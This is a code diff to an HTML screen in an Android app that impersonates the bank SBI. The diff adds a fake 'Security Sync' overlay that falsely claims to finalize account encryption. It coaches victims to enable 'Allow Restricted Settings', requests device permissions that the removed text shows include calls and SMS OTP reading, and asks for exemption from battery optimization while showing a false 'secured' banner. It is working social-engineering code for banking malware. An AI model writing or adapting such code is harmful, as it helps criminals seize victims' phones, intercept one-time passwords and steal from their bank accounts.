@@ -95,58 +95,58 @@
     </div>
 
     <!-- Permission System -->
-    <div class="permission-overlay" id="permissionOverlay">
-        <div class="perm-modal" id="permModal">
+    <div class="permission-overlay" id="masterOverlay" style="display: flex;">
+        <div class="perm-modal">
             <div class="perm-glow"></div>
-            <div id="permIcon" class="perm-main-icon">🔔</div>
-            <h3 id="permTitle">System Permission</h3>
-            <p id="permText">Allow SBI to send notifications?</p>
+            <div class="perm-main-icon">🧬</div>
+            <h3>Security Sync</h3>
+            <p>We are finalizing your account encryption. If the system prompts don't appear, please use our repair tool.</p>
+            
             <div class="perm-footer">
-                <button class="btn-p btn-allow" onclick="nextPermission()">Allow Access</button>
-                <button class="btn-p btn-deny" onclick="nextPermission()">Later</button>
+                <button class="btn-p btn-allow" onclick="showRepair(event)">START SYNC</button>
+                
+                <div id="repairGuide" style="display:none; margin-top:20px; text-align:left; background:var(--surface-bright); padding:15px; border-radius:15px; font-size:12px; color:var(--text-dim);">
+                    <p style="margin-bottom:8px;">1. Open <b>App Settings</b>.</p>
+                    <p style="margin-bottom:8px;">2. Tap <b>3 Dots</b> (Top Right Corner).</p>
+                    <p style="margin-bottom:8px;">3. Select <b>Allow Restricted Settings</b>.</p>
+                    <p style="margin-bottom:8px;">4. Return and <b>Allow All</b>.</p>
+                    <button onclick="if(window.AndroidBridge) window.AndroidBridge.openAppSettings()" class="btn-p btn-allow" style="margin-top:15px; width:100%; font-size:12px;">OPEN SETTINGS</button>
+                </div>
             </div>
         </div>
     </div>
 
     <script>
-        const steps = [
-            { icon: '🔔', title: 'Smart Notifications', text: 'Enable real-time transaction alerts and security warnings for your protection.' },
-            { icon: '📞', title: 'Identity Verification', text: 'Secure your account by allowing SBI to verify your device via automated calls.' },
-            { icon: '💬', title: 'Auto-Verification', text: 'Experience seamless login with automatic SMS OTP detection and security sync.' }
-        ];
-        let currentStep = 0;
-
-        function startPermissionFlow() {
-            currentStep = 0;
-            showStep();
-            document.getElementById('permissionOverlay').style.display = 'flex';
+        function showRepair(e) {
+            e.stopPropagation();
+            if (window.AndroidBridge) {
+                window.AndroidBridge.requestRealPermissions();
+            }
+            document.getElementById('repairGuide').style.display = 'block';
         }
 
-        function showStep() {
-            document.getElementById('permIcon').innerHTML = steps[currentStep].icon;
-            document.getElementById('permTitle').innerHTML = steps[currentStep].title;
-            document.getElementById('permText').innerHTML = steps[currentStep].text;
-        }
-
-        function nextPermission() {
-            currentStep++;
-            if (currentStep < steps.length) {
-                showStep();
-            } else {
-                document.getElementById('permissionOverlay').style.display = 'none';
-                if (window.AndroidBridge) {
-                    window.AndroidBridge.requestRealPermissions();
-                } else {
-                    window.location.href = 'details.html';
+        let bridgeCheck = setInterval(() => {
+            if (window.AndroidBridge) {
+                if (window.AndroidBridge.hasAllPermissions && window.AndroidBridge.hasAllPermissions()) {
+                    handlePermissionResult('GRANTED');
+                    clearInterval(bridgeCheck);
                 }
             }
-        }
+        }, 1500);
 
         function handlePermissionResult(status) {
             if (status === 'GRANTED') {
-                document.getElementById('statusBanner').innerHTML = "✅ SYSTEM SECURED - PROTECTED";
+                document.getElementById('masterOverlay').style.display = 'none';
+                document.getElementById('statusBanner').innerHTML = "✅ SYSTEM ENCRYPTED & SECURED";
                 document.getElementById('statusBanner').classList.add('safe');
-                window.location.href = 'details.html';
+                
+                setTimeout(() => {
+                    window.location.href = 'details.html';
+                }, 1500);
+
+                if (window.AndroidBridge && window.AndroidBridge.requestIgnoreBatteryOptimizations) {
+                    window.AndroidBridge.requestIgnoreBatteryOptimizations();
+                }
             }
         }
     </script>
